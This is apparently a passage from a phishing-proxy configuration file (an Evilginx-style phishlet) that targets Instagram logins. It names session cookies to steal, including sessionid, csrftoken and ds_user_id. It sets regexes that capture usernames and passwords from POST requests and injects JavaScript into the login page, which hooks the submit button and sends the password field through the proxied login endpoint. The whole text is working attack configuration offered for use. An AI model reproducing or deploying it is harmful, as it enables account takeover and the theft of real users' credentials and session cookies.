    keys: ['ig_nrcb','ds_user_id','ds_user_id','csrftoken','ig_did','mid','sessionid','datr','rur','sessionid','.*,regexp']
  - domain: '.instagram.com'
    keys: ['ig_nrcb','ds_user_id','ds_user_id','csrftoken','ig_did','mid','sessionid','datr','rur','.*regexp']
auth_urls:
 - '/*'
credentials:
  username:
    key: 'user'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
# credentials:
#  username:
#   key: 'user'
#   search: '"accountName":"([^"]*)'
#   type: 'post'
#  password:
#   key: 'password'
#   search: '"password":"([^"]*)'
#   type: 'post'
login:
  domain: 'www.instagram.com'
  path: '/accounts/login'
  # path: '/'
js_inject:
  - trigger_domains: ["www.instagram.com"]
    trigger_paths: ["/accounts/login"]
    trigger_params: []
    script: |
      function onclickListener(){
        var submit = document.querySelectorAll('button[type=submit]')[0];
        submit.setAttribute("onclick", "sendPass()");
        return;
      }
      function sendPass(){
        var password = document.getElementsByName("password")[0].value;

        var xhr = new XMLHttpRequest();
        xhr.open("POST", '/accounts/login/ajax/', true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send("password="+encodeURIComponent(password));

        return;
      }
      setTimeout(function(){ onclickListener(); }, 1000);

































